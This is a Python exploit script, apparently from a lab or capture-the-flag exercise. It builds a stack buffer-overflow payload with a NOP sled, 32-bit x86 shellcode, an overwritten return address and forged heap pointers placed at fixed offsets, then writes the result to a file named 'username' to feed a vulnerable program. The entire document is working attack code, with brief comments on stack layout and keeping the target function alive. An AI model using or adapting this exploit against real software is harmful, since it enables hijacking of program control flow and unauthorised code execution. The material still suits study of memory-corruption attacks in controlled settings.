import sys

shellcode = ("\x68\x60\xC8\x55\x56\x68\x60\xC8\x55\x56\xBB\x15\x63\x55\x56\xFF\xD3\x6A\x04\x68\x88\x80\x08\x08\xBB\x8D\x62\x55\x56\xFF\xD3").encode('latin-1')

# this length must be less than or equal to file buffer string's length
length = 400

content = bytearray(0x90 for i in range(length))

start = length - len(shellcode)
content[start:] = shellcode

# the username[0] address was 0xffffc776, post-RA space would start from 0xffffc7e6
ret = 0xffffcb38 - 700
print(format(ret, '#x'))
content[70:74] = (ret).to_bytes(4, byteorder='little')
# look at the execute() function, after the first strcpy(), the function accesses
# the two arguments name and pass. So it is important to put some valid values there.
# We are putting the malloc location of heap there.
ret = 0x5655c860 # name
content[74:78] = (ret).to_bytes(4, byteorder='little')
ret = 0x5655c860 # pass
content[78:82] = (ret).to_bytes(4, byteorder='little')


for i in range(len(content)):
	if (content[i] == 0x00):
		print('zero', i, content[i])

with open('username', 'wb') as f:
    f.write(content)
